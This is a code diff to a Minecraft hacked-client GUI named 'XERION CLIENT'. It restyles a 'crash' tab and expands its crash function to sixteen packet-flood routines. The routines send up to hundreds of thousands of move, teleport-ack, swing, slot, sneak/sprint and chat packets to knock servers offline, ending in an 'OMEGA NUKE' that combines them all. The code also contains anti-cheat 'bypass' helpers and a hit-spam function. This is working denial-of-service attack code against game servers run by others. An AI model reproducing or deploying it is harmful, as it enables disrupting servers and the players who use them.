@@ -40,6 +40,12 @@ public class ProfessorScreen extends Screen {
     private static final int GREEN      = 0xFF00FF99;
     private static final int ORANGE     = 0xFFFF8800;
     private static final int PURPLE     = 0xFFAA55FF;
+    // ── Danger / crash palette ────────────────────────────────────────
+    private static final int BLOOD      = 0xFFCC0011;  // deep blood red
+    private static final int DANGER     = 0xFFFF0033;  // neon danger red
+    private static final int VOID_RED   = 0xFF1A0005;  // near-black red
+    private static final int ACID       = 0xFFAAFF00;  // toxic green
+    private static final int BONE       = 0xFFEEE8D5;  // skull bone white
 
     // ── Layout ─────────────────────────────────────────────────────────────
     private static final int PW = 760, PH = 520, TH = 36, TABH = 26;
@@ -235,9 +241,39 @@ public class ProfessorScreen extends Screen {
     }
 
     private void buildCrash(int cx,int bpy){
-        String[] cn={"Packet Crash — 100k rapid packets","NBT Crash — deep NBT payload","Book Crash — 50-page book packet","Entity Crash — 5k interact flood","Tick Lag — 10k complex sequence","Move Spam — 50k extreme coords","Chat Flood — 200 rapid messages","Teleport Bomb — 10k random acks"};
-        for(int i=0;i<cn.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((crashType==idx?"▶ ":"")+cn[idx]),b->{cs();crashType=idx;rebuild();}).dimensions(cx-260,bpy+72+i*22,520,18).build());}
-        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE CRASH ]"),b->{cs();doCrash();}).dimensions(cx-120,bpy+264,240,28).build());
+        // 16 crash types — 2 columns of 8
+        String[] cn={
+            "☠ Packet Storm    — 100k move flood",
+            "☠ Teleport Bomb   — 50k random acks",
+            "☠ Move Overflow   — extreme coords",
+            "☠ Chat Flood      — 500 messages",
+            "☠ Swing Storm     — 200k swings",
+            "☠ Slot Bomb       — 100k slot spam",
+            "☠ Ground Glitch   — ground flip 80k",
+            "☠ Full Combo Nuke — all types mix",
+            "☠ Sneak Bomb      — 30k sneak cycle",
+            "☠ Sprint Storm    — 30k sprint cycle",
+            "☠ Look Nuke       — extreme yaw/pitch",
+            "☠ Interact Bomb   — 50k off-hand",
+            "☠ Teleport Mix    — ack + move 60k",
+            "☠ Dual Hand Nuke  — both hands 100k",
+            "☠ Tick Overload   — 10k combo tick",
+            "☠ OMEGA NUKE  ★★★ — ALL types FULL"
+        };
+        int col=cn.length/2, hw=254;
+        for(int i=0;i<cn.length;i++){
+            final int idx=i;
+            int col2=i<col?0:1, row=i%col;
+            boolean isDanger=(idx==15);
+            addDrawableChild(ButtonWidget.builder(
+                Text.literal((crashType==idx?"▶ ":"  ")+cn[i]),
+                b->{cs();crashType=idx;rebuild();}
+            ).dimensions(cx-260+col2*(hw+8),bpy+72+row*21,hw,19).build());
+        }
+        addDrawableChild(ButtonWidget.builder(
+            Text.literal("☠  EXECUTE CRASH  ☠"),
+            b->{cs();doCrash();}
+        ).dimensions(cx-140,bpy+252,280,28).build());
     }
 
     private void buildCombat(int cx,int bpy){
@@ -378,17 +414,20 @@ public class ProfessorScreen extends Screen {
 
         int cx2=width/2, bpx=cx2-PW/2, bpy=height/2-PH/2;
 
-        // ── Background ─────────────────────────────────────────────────────
-        ctx.fill(0,0,width,height,BG);
-        for(int x=0;x<width;x+=44){ctx.fill(x,0,x+1,height,withA(0x113355,8));}
-        for(int y=0;y<height;y+=44){ctx.fill(0,y,width,y+1,withA(0x113355,8));}
+        // ── Background — red grid on CRASH tab ─────────────────────────────
+        int bgBase=tab==3?0xFF0A0000:BG;
+        ctx.fill(0,0,width,height,bgBase);
+        int gridCol=tab==3?0x220000:0x113355;
+        for(int xi=0;xi<width;xi+=44){ctx.fill(xi,0,xi+1,height,withA(gridCol,10));}
+        for(int yi=0;yi<height;yi+=44){ctx.fill(0,yi,width,yi+1,withA(gridCol,10));}
 
         // Scan line
         int scA=(int)(12+8*hypeSmooth);
         ctx.fill(0,(int)(scanA-2),width,(int)scanA,withA(BORDER2,scA));
 
-        // Data streams
-        for(int i=0;i<70;i++){if(dsY[i]<0)continue;int a=(int)(45+25*hypeSmooth);if(a>0)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],withA(0x44BBDD,a),false);}
+        // Data streams — red on CRASH tab
+        int dsCol=tab==3?0xFF3300:0x44BBDD;
+        for(int i=0;i<70;i++){if(dsY[i]<0)continue;int a=(int)(45+25*hypeSmooth);if(a>0)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],withA(dsCol,a),false);}
 
         // Snow particles
         for(int i=0;i<SCNT;i++){
@@ -400,31 +439,57 @@ public class ProfessorScreen extends Screen {
         }
         // Sparkles
         for(int i=0;i<GPCNT;i++){float tw=(MathHelper.sin(gpp[i])+1f)/2f;if(tw<0.65f)continue;int a=(int)((tw-.65f)*2.86f*200);if(a<20)continue;int sz=(int)gps[i];ctx.fill((int)gpx[i]-sz,(int)gpy[i],(int)gpx[i]+sz,(int)gpy[i]+1,withA(SNOW_W,a));ctx.fill((int)gpx[i],(int)gpy[i]-sz,(int)gpx[i]+1,(int)gpy[i]+sz,withA(SNOW_W,a));}
-        // Particles
-        for(int i=0;i<PCNT;i++){if(pal[i]<.12f)continue;int[] cols2={0xFF55DDFF,0xFF00FFCC,0xFF88AAFF,0xFFFFD700,0xFF00FF99};int a=(int)(pal[i]*(0.5f+0.5f*MathHelper.sin(pph[i]))*160*(1+hypeSmooth));if(a<15)continue;int sz=(int)(psz[i]*(1+hypeSmooth*.5f));ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,withA(cols2[pct[i]],a));}
+        // Particles — red on CRASH tab, ice otherwise
+        for(int i=0;i<PCNT;i++){if(pal[i]<.12f)continue;
+            int[] cols2=tab==3?new int[]{0xFFFF0022,0xFFCC0011,0xFFFF3300,0xFFFF6600,0xFFAA0033}:new int[]{0xFF55DDFF,0xFF00FFCC,0xFF88AAFF,0xFFFFD700,0xFF00FF99};
+            int a=(int)(pal[i]*(0.5f+0.5f*MathHelper.sin(pph[i]))*160*(1+hypeSmooth));if(a<15)continue;int sz=(int)(psz[i]*(1+hypeSmooth*.5f));ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,withA(cols2[pct[i]],a));}
         // Trail
         for(TrailPt tp:trail){int a=(int)(tp.life()*120);if(a>0)ctx.fill(tp.x()-1,tp.y()-1,tp.x()+1,tp.y()+1,withA(BORDER2,a));}
         // Burst
         for(float[] b2:burstPts){int a=(int)(b2[4]*200);if(a>0)ctx.fill((int)b2[0],(int)b2[1],(int)b2[0]+2,(int)b2[1]+2,withA(0xFFFFD700,a));}
 
         // ── Panel shadow + body ─────────────────────────────────────────────
-        ctx.fill(bpx+16,bpy+16,bpx+PW+16,bpy+PH+16,withA(0xFF000000,145));
-        ctx.fill(bpx+8, bpy+8, bpx+PW+8, bpy+PH+8, withA(0xFF000000,65));
-        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,PANEL_BG);
-        for(int y=0;y<60;y++){int ga=(int)((1f-y/60f)*22*(1+hypeSmooth));if(ga>0)ctx.fill(bpx,bpy+y,bpx+PW,bpy+y+1,(ga<<24)|0xAADDFF);}
+        ctx.fill(bpx+16,bpy+16,bpx+PW+16,bpy+PH+16,withA(0xFF000000,160));
+        ctx.fill(bpx+8, bpy+8, bpx+PW+8, bpy+PH+8, withA(0xFF000000,80));
+        int panelBg=(tab==3)?0xFF0D0003:PANEL_BG;
+        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,panelBg);
+        if(tab==3){
+            // Red gradient header
+            for(int yr=0;yr<60;yr++){int ga=(int)((1f-yr/60f)*28*(float)(0.55+0.45*Math.sin(tick*0.06)));if(ga>0)ctx.fill(bpx,bpy+yr,bpx+PW,bpy+yr+1,(ga<<24)|0xCC0011);}
+        } else {
+            for(int yr=0;yr<60;yr++){int ga=(int)((1f-yr/60f)*22*(1+hypeSmooth));if(ga>0)ctx.fill(bpx,bpy+yr,bpx+PW,bpy+yr+1,(ga<<24)|0xAADDFF);}
+        }
 
         // Hype pulse overlay
         if(hypeSmooth>0.05f){int ha=(int)(hypeSmooth*18);if(ha>0)ctx.fill(bpx,bpy,bpx+PW,bpy+PH,withA(0xFF004488,ha));}
+        // ── CRASH TAB: blood overlay + danger grid ─────────────────────
+        if(tab==3){
+            float dPulse=(float)(0.55+0.45*Math.sin(tick*0.06));
+            int bloodA=(int)(dPulse*38);
+            ctx.fill(bpx,bpy,bpx+PW,bpy+PH,withA(BLOOD,bloodA));
+            // Danger scan lines — bright red sweep
+            int dScan=(int)((tick*1.8f)%(PH+60))-30;
+            ctx.fill(bpx,bpy+dScan,bpx+PW,bpy+dScan+3,withA(DANGER,(int)(dPulse*90)));
+            ctx.fill(bpx,bpy+dScan+3,bpx+PW,bpy+dScan+5,withA(DANGER,(int)(dPulse*35)));
+            // Red vignette edges
+            for(int e=0;e<14;e++){int ea=(int)((14-e)*dPulse*4.5f);if(ea>0){ctx.fill(bpx,bpy+e,bpx+PW,bpy+e+1,withA(DANGER,ea));ctx.fill(bpx,bpy+PH-e-1,bpx+PW,bpy+PH-e,withA(DANGER,ea));}}
+            // Vertical red bars (left/right)
+            for(int e=0;e<10;e++){int ea=(int)((10-e)*dPulse*5f);if(ea>0){ctx.fill(bpx+e,bpy,bpx+e+1,bpy+PH,withA(DANGER,ea));ctx.fill(bpx+PW-e-1,bpy,bpx+PW-e,bpy+PH,withA(DANGER,ea));}}
+        }
 
-        // ── Border ─────────────────────────────────────────────────────────
-        int bA=(int)((0.9f+0.1f*glow)*255); int ogA=(int)(0.28f*glow*255*(1+hypeSmooth*.5f));
-        if(ogA>0){ctx.fill(bpx-5,bpy-5,bpx+PW+5,bpy+1,withA(BORDER,ogA));ctx.fill(bpx-5,bpy+PH-1,bpx+PW+5,bpy+PH+5,withA(BORDER,ogA));ctx.fill(bpx-5,bpy-5,bpx+1,bpy+PH+5,withA(BORDER,ogA));ctx.fill(bpx+PW-1,bpy-5,bpx+PW+5,bpy+PH+5,withA(BORDER,ogA));}
-        ctx.fill(bpx,     bpy,     bpx+PW,  bpy+5,    withA(BORDER,bA));
-        ctx.fill(bpx,     bpy+PH-5,bpx+PW,  bpy+PH,   withA(BORDER,bA));
-        ctx.fill(bpx,     bpy,     bpx+5,   bpy+PH,   withA(BORDER,bA));
-        ctx.fill(bpx+PW-5,bpy,     bpx+PW,  bpy+PH,   withA(BORDER,bA));
-        ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,withA(TITLE1,(int)(0.38f*255)));
-        ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,withA(TITLE1,(int)(0.38f*255)));
+        // ── Border — red when CRASH, ice otherwise ─────────────────────────
+        int bA=(int)((0.9f+0.1f*glow)*255);
+        float dPulse2=(float)(0.55+0.45*Math.sin(tick*0.06));
+        int borderCol=(tab==3)?withA(DANGER,(int)(dPulse2*255)):BORDER;
+        int outerCol =(tab==3)?withA(BLOOD,(int)(dPulse2*255)):BORDER;
+        int ogA=(tab==3)?(int)(dPulse2*160):(int)(0.28f*glow*255*(1+hypeSmooth*.5f));
+        if(ogA>0){ctx.fill(bpx-5,bpy-5,bpx+PW+5,bpy+1,withA(outerCol,ogA));ctx.fill(bpx-5,bpy+PH-1,bpx+PW+5,bpy+PH+5,withA(outerCol,ogA));ctx.fill(bpx-5,bpy-5,bpx+1,bpy+PH+5,withA(outerCol,ogA));ctx.fill(bpx+PW-1,bpy-5,bpx+PW+5,bpy+PH+5,withA(outerCol,ogA));}
+        ctx.fill(bpx,     bpy,     bpx+PW,  bpy+5,    withA(borderCol,bA));
+        ctx.fill(bpx,     bpy+PH-5,bpx+PW,  bpy+PH,   withA(borderCol,bA));
+        ctx.fill(bpx,     bpy,     bpx+5,   bpy+PH,   withA(borderCol,bA));
+        ctx.fill(bpx+PW-5,bpy,     bpx+PW,  bpy+PH,   withA(borderCol,bA));
+        ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,withA(tab==3?BLOOD:TITLE1,(int)(0.38f*255)));
+        ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,withA(tab==3?BLOOD:TITLE1,(int)(0.38f*255)));
 
         // Gold corners + crystal shards
         int gcA=(int)(0.95f*255); drawCorner(ctx,bpx,bpy,bpx+PW,bpy+PH,36,withA(GOLD,gcA));
@@ -438,16 +503,27 @@ public class ProfessorScreen extends Screen {
         String t1="XERION",t2=" CLIENT";
         int tw1=textRenderer.getWidth(t1),tw2=textRenderer.getWidth(t2);
         int tx=cx2-(tw1+tw2)/2, ty=bpy+10;
-        // Rainbow hue shimmer on "XERION"
-        float hr=hue; int shimmerCol=hsvToRgb(hr,0.5f,1f);
-        int glA=(int)(60+45*glow); for(int d=-5;d<=5;d++){int g2=Math.max(0,glA-Math.abs(d)*9);if(g2>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(g2<<24)|0x00CCFF,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(g2<<24)|0x00CCFF,false);}}
-        int tA=(int)(220+35*glow);
-        ctx.drawText(textRenderer,t1,tx,ty,withA(shimmerCol,tA),false);
-        ctx.drawText(textRenderer,t2,tx+tw1,ty,withA(TITLE2,tA),false);
-
+        if(tab==3){
+            // CRASH TAB: glitch title — blood red shadow + offset flicker
+            float gf=(float)(Math.sin(tick*0.22)*2.5); int gi=(int)gf;
+            int bloodA2=(int)(180+60*glow);
+            for(int d=1;d<=4;d++){ctx.drawText(textRenderer,t1+t2,tx+gi+d,ty,withA(BLOOD,80/d),false);}
+            ctx.drawText(textRenderer,t1,tx+gi,ty,withA(DANGER,bloodA2),false);
+            ctx.drawText(textRenderer,t2,tx+tw1+gi,ty,withA(BLOOD,bloodA2),false);
+            // "WARNING" badge left
+            ctx.drawText(textRenderer,"☠ CRASH",bpx+8,bpy+9,withA(DANGER,(int)(160+80*glow)),false);
+        } else {
+            // Normal: rainbow hue shimmer on "XERION"
+            float hr=hue; int shimmerCol=hsvToRgb(hr,0.5f,1f);
+            int glA=(int)(60+45*glow); for(int d=-5;d<=5;d++){int g2=Math.max(0,glA-Math.abs(d)*9);if(g2>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(g2<<24)|0x00CCFF,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(g2<<24)|0x00CCFF,false);}}
+            int tA=(int)(220+35*glow);
+            ctx.drawText(textRenderer,t1,tx,ty,withA(shimmerCol,tA),false);
+            ctx.drawText(textRenderer,t2,tx+tw1,ty,withA(TITLE2,tA),false);
+        }
         // Version badge
         String ver="v1";
-        ctx.drawText(textRenderer,ver,bpx+PW-textRenderer.getWidth(ver)-8,bpy+9,withA(CRYSTAL,(int)(160+60*glow)),false);
+        int verCol=(tab==3)?withA(DANGER,(int)(180+60*glow)):withA(CRYSTAL,(int)(160+60*glow));
+        ctx.drawText(textRenderer,ver,bpx+PW-textRenderer.getWidth(ver)-8,bpy+9,verCol,false);
 
         // Subtitle / player info
         String sub; int subCol=CRYSTAL;
@@ -709,19 +785,98 @@ public class ProfessorScreen extends Screen {
     private void doCrash(){
         if(np())return; final int ct=crashType;
         final double cx3=client.player.getX(),cy3=client.player.getY(),cz3=client.player.getZ();
-        BackgroundTaskManager.submit("Crash #"+(ct+1),()->{
+        BackgroundTaskManager.submit("CRASH["+ct+"]",()->{
+            var nh=client.getNetworkHandler();
             switch(ct){
-                case 0->{for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+bypassDY(i),cz3,i%2==0));}catch(Exception ignored){}}
-                case 1->{for(int i=0;i<5000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}catch(Exception ignored){}}
-                case 2->{for(int i=0;i<500&&!BackgroundTaskManager.shouldStop();i++){try{if(client.getNetworkHandler()!=null){client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}}catch(Exception ignored){}}}
-                case 3->{for(int i=0;i<5000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}
-                case 4->{for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++){try{if(client.getNetworkHandler()!=null){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%32767));}}catch(Exception ignored){}}}
-                case 5->{for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+rng.nextGaussian()*1e6,1e8+rng.nextGaussian()*1e5,cz3+rng.nextGaussian()*1e6,false));}catch(Exception ignored){}}
-                case 6->{for(int i=0;i<200&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendChatMessage("xr"+i);}catch(Exception ignored){}}
-                case 7->{for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));}catch(Exception ignored){}}
+                // ── 0: Packet Storm — 100k move flood ─────────────────────
+                case 0->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+bypassDY(i),cz3,i%2==0));}catch(Exception g){} }
+                // ── 1: Teleport Bomb — 50k random acks ───────────────────
+                case 1->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));}catch(Exception g){} }
+                // ── 2: Move Overflow — extreme coordinates ────────────────
+                case 2->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
+                        cx3+rng.nextGaussian()*3e7, 1e8+rng.nextGaussian()*1e6, cz3+rng.nextGaussian()*3e7,false));}catch(Exception g){} }
+                // ── 3: Chat Flood — 500 rapid messages ───────────────────
+                case 3->{ for(int i=0;i<500&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendChatMessage("xerion"+i);}catch(Exception g){} }
+                // ── 4: Swing Storm — 200k swings ─────────────────────────
+                case 4->{ for(int i=0;i<200000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception g){} }
+                // ── 5: Slot Bomb — 100k slot spam ─────────────────────────
+                case 5->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception g){} }
+                // ── 6: Ground Glitch — 80k ground flip ───────────────────
+                case 6->{ for(int i=0;i<80000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null){nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3,cz3,i%2==0));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+(i%2==0?-0.0001:0.0001),cz3,i%2!=0));}}catch(Exception g){} }
+                // ── 7: Full Combo Nuke — swing+move+slot+ack ─────────────
+                case 7->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null){nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));
+                        if(i%3==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                        if(i%4==0)nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                        if(i%6==0)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}}catch(Exception g){} }
+                // ── 8: Sneak Bomb — 30k sneak cycle ──────────────────────
+                case 8->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null&&client.player!=null){
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3,cz3,true));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));}}catch(Exception g){} }
+                // ── 9: Sprint Storm — 30k sprint cycle ───────────────────
+                case 9->{ for(int i=0;i<30000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null&&client.player!=null){
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i)*0.3,cy3,cz3+bypassZ(i)*0.3,true));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.STOP_SPRINTING));}}catch(Exception g){} }
+                // ── 10: Look Nuke — extreme yaw/pitch ────────────────────
+                case 10->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null){float yaw=(float)(rng.nextGaussian()*720);float pitch=(float)(rng.nextGaussian()*90);
+                        nh.sendPacket(new PlayerMoveC2SPacket.Full(cx3,cy3,cz3,yaw,pitch,true));
+                        if(i%5==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}}catch(Exception g){} }
+                // ── 11: Interact Bomb — 50k off-hand ─────────────────────
+                case 11->{ for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null)nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));}catch(Exception g){} }
+                // ── 12: Teleport Mix — ack+move 60k ──────────────────────
+                case 12->{ for(int i=0;i<60000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null){nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3,cz3+bypassZ(i),true));
+                        if(i%8==0)nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}}catch(Exception g){} }
+                // ── 13: Dual Hand Nuke — both hands 100k ─────────────────
+                case 13->{ for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null){nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
+                        if(i%7==0)nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}}catch(Exception g){} }
+                // ── 14: Tick Overload — 10k full combo per tick ───────────
+                case 14->{ for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++)
+                    try{if(nh!=null&&client.player!=null){
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                        nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
+                        nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));
+                        nh.sendPacket(new TeleportConfirmC2SPacket(i%32767));
+                        nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,i%2==0?ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY:ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));
+                        nh.sendPacket(new ClientCommandC2SPacket(client.player,i%3==0?ClientCommandC2SPacket.Mode.START_SPRINTING:ClientCommandC2SPacket.Mode.STOP_SPRINTING));}}catch(Exception g){} }
+                // ── 15: OMEGA NUKE — all types, full power ★★★ ───────────
+                case 15->{ for(int wave=0;wave<5&&!BackgroundTaskManager.shouldStop();wave++){
+                    for(int i=0;i<20000&&!BackgroundTaskManager.shouldStop();i++){
+                        try{if(nh!=null&&client.player!=null){
+                            nh.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
+                            nh.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
+                            nh.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+rng.nextGaussian()*3e5,cy3+bypassDY(i),cz3+rng.nextGaussian()*3e5,rng.nextBoolean()));
+                            nh.sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));
+                            nh.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
+                            if(i%2==0)nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
+                            if(i%3==0)nh.sendPacket(new ClientCommandC2SPacket(client.player,ClientCommandC2SPacket.Mode.START_SPRINTING));
+                            if(i%5==0){float y=(float)(rng.nextGaussian()*360);float p=(float)(rng.nextGaussian()*90);nh.sendPacket(new PlayerMoveC2SPacket.Full(cx3,cy3,cz3,y,p,rng.nextBoolean()));}
+                        }}catch(Exception g){}
+                    }
+                }}
             }
         });
-        flash("☠ Queued in BG — close screen safely!",RED); addVl(50f); triggerBurst();
+        String[] msgs={"☠ Storm queued","☠ Bomb armed","☠ Overflow live","☠ Flood start","☠ Swing nuke","☠ Slot bomb","☠ Glitch run","☠ Combo nuke","☠ Sneak storm","☠ Sprint storm","☠ Look nuke","☠ Interact bomb","☠ Tele-mix","☠ Dual nuke","☠ Tick overload","☠☠☠ OMEGA NUKE ARMED"};
+        flash(msgs[Math.min(ct,msgs.length-1)]+" — close GUI safely",DANGER); addVl(100f); triggerBurst();
     }
 
     private void combatHit(){if(np())return;for(int i=0;i<200*burst;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Hit Spam ×"+(200*burst),ORANGE);addVl(25f);}
